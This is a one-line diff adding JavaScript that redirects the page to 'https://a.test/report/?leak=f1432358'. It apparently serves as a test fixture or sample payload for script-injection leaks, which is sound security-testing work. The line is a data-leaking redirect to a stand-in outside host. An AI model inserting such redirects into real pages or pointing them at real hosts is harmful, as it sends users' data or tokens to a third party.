@@ -1,0 +1,1 @@
+document.location.href = 'https://a.test/report/?leak=f1432358';
